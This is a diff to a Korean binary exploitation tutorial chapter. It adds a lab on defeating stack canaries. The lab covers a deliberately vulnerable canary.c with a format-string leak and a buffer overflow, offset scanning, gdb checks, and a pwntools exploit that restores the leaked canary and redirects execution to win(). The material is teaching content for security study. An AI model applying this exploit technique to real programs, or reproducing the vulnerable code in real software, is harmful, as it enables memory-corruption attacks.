@@ -182,6 +182,8 @@ int main(void) {
 
 ```bash
 gcc -g -O0 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
+# vuln.c:13:5: warning: 'read' writing 256 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
+#   ← 3.1절의 경고. 빌드는 되지만 취약점이 컴파일 단계에서 이미 보인다 (gcc 13, 플래그 없이 기본 켜짐)
 checksec --file=./vuln
 #   Stack:      No canary found
 #   NX:         NX unknown - GNU_STACK missing   (Stack: Executable)
@@ -348,41 +350,98 @@ CFI(Control Flow Integrity), CET shadow stack, ARM PAC은 반환 주소 덮어�
 
 표의 첫 줄을 끝까지 따라간다. 4절의 `vuln.c`에 포맷 스트링([3장](03-format-string.md)) 한 줄을 더한 `canary.c`를 쓴다. 같은 함수에서 입력을 **두 번** 받는다. 첫 입력은 `printf(name)`으로 출력되고(누출), 두 번째 입력은 `read(0, name, 256)`으로 오버플로된다(덮어쓰기). 실제 제품에서 이 둘은 다른 함수, 다른 요청이어도 되고, 같은 프로세스 안이기만 하면 된다. 카나리는 프로세스 시작 때 한 번 정해져 바뀌지 않기 때문이다([7장 5절](07-mitigations.md)).
 
+```c
+/* canary.c — vuln.c + printf(name) 한 줄 */
+#include <stdio.h>
+#include <unistd.h>
+
+void win(void) {
+    puts("[+] win() reached");
+}
+
+void greet(void) {
+    char name[64];
+    printf("name? ");
+    fflush(stdout);
+    read(0, name, 64);           /* 1차 입력: 64바이트까지. 넘치지 않는다 */
+    printf(name);                /* ❌ 포맷 스트링 → 스택 누출 */
+    printf("again? ");
+    fflush(stdout);
+    read(0, name, 256);          /* ❌ 2차 입력: 오버플로 */
+    printf("hello, %s\n", name);
+}
+
+int main(void) {
+    greet();
+    return 0;
+}
+```
+
 ```bash
 gcc -g -O0 -fstack-protector-all -no-pie -o canary canary.c
-checksec --file=./canary        # Stack: Canary found / PIE: No PIE
+# canary.c:14:12: warning: format not a string literal and no format arguments [-Wformat-security]
+# canary.c:17:5: warning: 'read' writing 256 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
+checksec --file=./canary        # Stack: Canary found / NX: NX enabled / PIE: No PIE (0x400000)
 ```
+
+두 경고가 곧 이 프로그램의 두 취약점이다. 카나리와 NX는 켜 두고 PIE만 끈다(주소를 고정해 읽기 쉽게 하기 위해서다. 끝의 "읽을 것" (3)에서 PIE가 켜졌을 때를 다룬다).
 
 **1단계: 카나리가 포맷 스트링의 몇 번째 인자인가.** `%N$p`를 6부터 올리며 출력을 본다. 끝이 `00`인 8바이트 값이 카나리다(glibc x86-64는 최하위 바이트를 항상 0으로 둔다). gdb로 `x/gx $rbp-8`과 비교해 확정한다.
 
 ```
-$ for i in $(seq 6 20); do printf "%%$i\$p" | ./canary | head -1; echo " <- $i"; done
+$ for i in $(seq 6 20); do printf "%%$i\$p" | ./canary | head -1 | sed 's/name? //;s/again.*//'; echo " <- $i"; done
 ...
-0x2acf3dfce48f7600 <- 15      ← 카나리 (rbp-8)
-0x7ffe4e29ce30     <- 16      ← 저장된 rbp
-0x4012e3           <- 17      ← greet의 반환 주소 (main 안)
+(nil)               <- 14      ← 패딩
+0x413bfadbe3a82700  <- 15      ← 카나리 (rbp-8). 최하위 바이트가 00
+0x7ffc5bb2c090      <- 16      ← 저장된 rbp
+0x4012e7            <- 17      ← greet의 반환 주소 (main+32)
+0x7ffe60a77eb0      <- 18
+
+$ gdb -q ./canary
+(gdb) break 14                        # printf(name) 줄
+(gdb) run < /dev/null
+(gdb) p &name
+$1 = (char (*)[64]) 0x7fffffffc4b0    ← rbp-0x50
+(gdb) p $rbp
+$2 = (void *) 0x7fffffffc500
+(gdb) x/gx $rbp-8
+0x7fffffffc4f8: 0x5f8ac4b424e75a00    ← 카나리. %15$p와 같은 자리
+(gdb) x/gx $rbp+8
+0x7fffffffc508: 0x00000000004012e7    ← 반환 주소. %17$p와 같은 값
 ```
 
-`name[64]`은 `rbp-0x50`에서 시작하므로(gdb `p &name`) 6~13번째가 `name`, 14번째가 패딩, 15번째가 카나리다. 오프셋도 여기서 나온다. `name` 시작부터 카나리까지 72바이트, 저장된 rbp까지 80, 반환 주소까지 88이다.
+`name[64]`은 `rbp-0x50`에서 시작하므로 6~13번째가 `name`, 14번째가 패딩, 15번째가 카나리다. 오프셋도 여기서 나온다. `name` 시작부터 카나리까지 72바이트, 저장된 rbp까지 80, 반환 주소까지 88이다. 카나리 값은 실행마다 다르지만 **위치**(15번째, `rbp-8`)는 바이너리가 정하므로 고정이다.
 
-**2단계: 누출한 값을 그대로 넣어 덮어쓴다.** 흐름은 네 줄이다.
+**2단계: 누출한 값을 그대로 넣어 덮어쓴다.** pwntools 흐름의 핵심은 세 줄이다. 누출을 파싱하고, 카나리 자리에 그 값을 되돌려 놓고, 뒤에 반환 주소를 잇는다.
 
 ```python
-p.send(b'%15$p|%16$p|%17$p')                       # 1차 입력: 카나리 | 저장된 rbp | 반환 주소 누출
+#!/usr/bin/env python3
+# canary_x.py — 핵심 흐름만. 완성 스크립트가 아니다
+from pwn import *
+context.arch = 'amd64'
+elf = ELF('./canary')
+p = process('./canary')
+p.recvuntil(b'name? ')
+p.send(b'%15$p|%16$p|%17$p')                                   # 1차 입력: 카나리 | 저장된 rbp | 반환 주소 누출
 canary, rbp, ret = [int(x, 16) for x in p.recvuntil(b'again? ', drop=True).split(b'|')]
-payload = b'A'*72 + p64(canary) + p64(rbp) + p64(elf.symbols['win'])
-p.send(payload)                                    # 2차 입력: 카나리를 원래 값으로 "복원"하며 지나간다
+log.info(f'canary={canary:#x} saved_rbp={rbp:#x} ret={ret:#x}')
+payload = b'A' * 72 + p64(canary) + p64(rbp) + p64(elf.symbols['win'])   # 72 + 8 + 8 + 8 = 96바이트
+p.send(payload)                                                # 2차 입력: 카나리를 원래 값으로 "복원"하며 지나간다
+print(p.recvall(timeout=2)); print('exit', p.poll(True))
 ```
 
 ```
 $ python3 canary_x.py
-canary=0xade6e1703298b200 saved_rbp=0x7ffc7087dbe0 ret=0x4012e3
-[+] win() reached
+[*] canary=0x7de20673aca85500 saved_rbp=0x7fff9b8d77f0 ret=0x4012e7
+b'hello, AAAAAAAA...AAAA\n[+] win() reached\n'
+exit -11
 ```
 
-카나리 자리에 다른 값(`0x4141414141414100`)을 넣으면 `*** stack smashing detected ***: terminated`로 끝난다(실측, SIGABRT). 검사 자체는 정상 동작하고 있다. 우회된 것은 "공격자가 카나리를 모른다"는 **가정**이다.
+`win`에 도달한 뒤 **-11(SIGSEGV)로 끝나는 것이 정상**이다. `greet`의 `ret`은 `win`을 `call`한 것이 아니라 그리로 **점프**했을 뿐이라 `win`의 반환 주소 자리에는 그다음 스택 슬롯, 즉 `main`의 저장된 rbp(스택 주소 `0x7fff...`)가 놓여 있고, `win`의 `ret`이 그리로 돌아가려는 순간 NX가 스택 실행을 막는다(gdb `x/gx $rbp`를 `main` 프레임에서 보면 `0x00007fffffffc5e0`처럼 스택 주소다). `win` 뒤에 8바이트를 더 쌓아 `win`의 반환처를 정하면 깔끔히 끝나며, 그것이 [8장](08-rop.md)의 ROP 체인이다.
 
-**읽을 것 세 가지.** (1) 이 우회에는 취약점이 **두 개** 필요했다. 누출(포맷 스트링, 또는 경계 밖 읽기)과 쓰기(오버플로). 보고서에서 "읽기 전용 누출, Low"로 분류된 버그가 카나리·PIE를 무력화하는 재료가 되는 이유다. (2) 저장된 rbp까지 누출해 **원래 값으로 되돌려 둔** 것은 `greet`가 `leave`로 프레임을 해체할 때 `main`의 rbp가 깨지지 않게 하기 위해서다. 아무 값이나 넣어도 `win`까지는 가지만, 뒤이어 `main`이 지역 변수를 쓰면 엉뚱한 곳을 건드린다. (3) PIE가 켜져 있었다면 17번째 인자(반환 주소 `0x4012e3`)에서 바이너리 기준 주소를 함께 계산한다. 누출 한 번이 카나리와 코드 주소를 같이 준다는 점이 포맷 스트링이 "완화 세트를 통째로 무력화"하는 이유이고, [7장 8절](07-mitigations.md) 조합표에서 "카나리 **와** 주소 누출"이 한 줄로 끝나는 경우다.
+카나리 자리에 다른 값(`0x4141414141414100`)을 넣으면 `*** stack smashing detected ***: terminated`로 끝난다(실측, exit -6 = SIGABRT). 검사 자체는 정상 동작하고 있다. 우회된 것은 "공격자가 카나리를 모른다"는 **가정**이다.
+
+**읽을 것 세 가지.** (1) 이 우회에는 취약점이 **두 개** 필요했다. 누출(포맷 스트링, 또는 경계 밖 읽기)과 쓰기(오버플로). 보고서에서 "읽기 전용 누출, Low"로 분류된 버그가 카나리·PIE를 무력화하는 재료가 되는 이유다. (2) 저장된 rbp까지 누출해 **원래 값으로 되돌려 둔** 것은 `greet`가 `leave`로 프레임을 해체할 때 `main`의 rbp가 깨지지 않게 하기 위해서다. 아무 값이나 넣어도 `win`까지는 가지만, 뒤이어 `main`이 지역 변수를 쓰면 엉뚱한 곳을 건드린다. (3) PIE가 켜져 있었다면 17번째 인자(반환 주소 `0x4012e7` = `main+32`)에서 바이너리 기준 주소를 함께 계산한다(`elf.address = ret - (elf.symbols['main'] + 32)`). 누출 한 번이 카나리와 코드 주소를 같이 준다는 점이 포맷 스트링이 "완화 세트를 통째로 무력화"하는 이유이고, [7장 8절](07-mitigations.md) 조합표에서 "카나리 **와** 주소 누출"이 한 줄로 끝나는 경우다.
 
 ## 8. 실제 CVE 사례
 
@@ -437,3 +496,4 @@ canary=0xade6e1703298b200 saved_rbp=0x7ffc7087dbe0 ret=0x4012e3
 | 2026-10-22 | 독자 테스트 반영: 8절 CVE-2019-18634의 영향·수정 버전을 CVE 레코드와 sudo NEWS로 재확인(공식 수정 1.8.31, 레코드의 1.8.26은 악용 가능 경계). 장 참조 표기 정리 | @anthonynoh5202 |
 | 2026-10-22 | 독자 테스트 반영: 7절에 7.1 "카나리 누출 → 재사용" 사례 추가. canary.c를 `-fstack-protector-all -no-pie`로 빌드해 `%N$p` 오프셋 스캔·gdb 프레임·pwntools 흐름·오답 카나리 대조를 실측 | @anthonynoh5202 |
 | 2026-10-23 | 기술 검증(2차): 7.1을 canary.c(vuln.c + `printf(name)`)로 재구성해 재실행: `%15$p`=카나리(최하위 바이트 00)·`%16$p`=저장된 rbp·`%17$p`=반환 주소, `name`은 `rbp-0x50`(오프셋 72/80/88), pwntools 흐름으로 win 도달, 오답 카나리는 `*** stack smashing detected ***` SIGABRT(-6). `-fcf-protection` 기본(endbr64) 확인. 수정 없음 | 검증팀 |
+| 2026-10-23 | 독자 테스트 2차 반영: 7.1에 `canary.c` 전문(24줄)·컴파일 플래그와 두 경고·오프셋 스캔과 gdb 대조 출력·pwntools 핵심 흐름(12줄)·기대 출력을 수록. win 도달 뒤 exit -11(SIGSEGV)이 정상인 이유(점프라 `win`의 반환처가 `main`의 저장된 rbp, NX)를 설명. 4.1 빌드 블록에 `-Wstringop-overflow` 경고 주석. 모두 Ubuntu 24.04 / gcc 13.3 / glibc 2.39 실측 | @anthonynoh5202 |
